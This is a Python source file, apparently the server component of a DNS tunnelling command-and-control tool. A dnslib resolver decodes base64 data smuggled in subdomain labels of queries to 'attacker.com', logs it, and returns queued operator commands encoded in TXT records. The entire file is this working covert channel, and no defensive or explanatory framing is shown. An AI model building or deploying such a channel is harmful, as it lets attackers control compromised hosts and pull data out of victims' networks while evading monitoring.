
import queue 
import base64
from dnslib.server import BaseResolver, QTYPE, RR 
from dnslib import TXT
from printer_message import PrinterMessage, PrinterMessageType
from enum import Enum

class TunnelMessageType(Enum): 
    PROBE = 1
    ACK = 2

class TunnelResolver(BaseResolver):
    def __init__(self, command_queue: queue.Queue, print_queue: queue.Queue): 
        self.command_queue = command_queue
        self.print_queue = print_queue
        super().__init__()

    def resolve(self, request, handler):
        reply = request.reply()

        qname = request.q.qname
        labels = str(qname).rstrip(".").split(".")

        # Expect: <payload>.attacker.com
        try:
            payload = labels[0]

            decoded = base64.urlsafe_b64decode(payload + "==").decode()

            if decoded == TunnelMessageType.PROBE.name: 
                self.print_queue.put(PrinterMessage(message=decoded, message_type=PrinterMessageType.PROBE))
            else: 
                self.print_queue.put(PrinterMessage(message=decoded, message_type=PrinterMessageType.RECEIVED))


            response_text = ""
            try: 
                response_text = self.command_queue.get_nowait()
                self.print_queue.put(PrinterMessage(message=response_text, message_type=PrinterMessageType.SENT))
            except queue.Empty: 
                response_text = TunnelMessageType.ACK.name

            encoded_resp = base64.urlsafe_b64encode(
                response_text.encode()
            ).decode()

            reply.add_answer(
                RR(
                    qname,
                    QTYPE.TXT,
                    rdata=TXT(encoded_resp),
                    ttl=0
                )
            )
        except Exception as e:
            self.print_queue.put(PrinterMessage(message=str(e), message_type=PrinterMessageType.ERROR))

        return reply



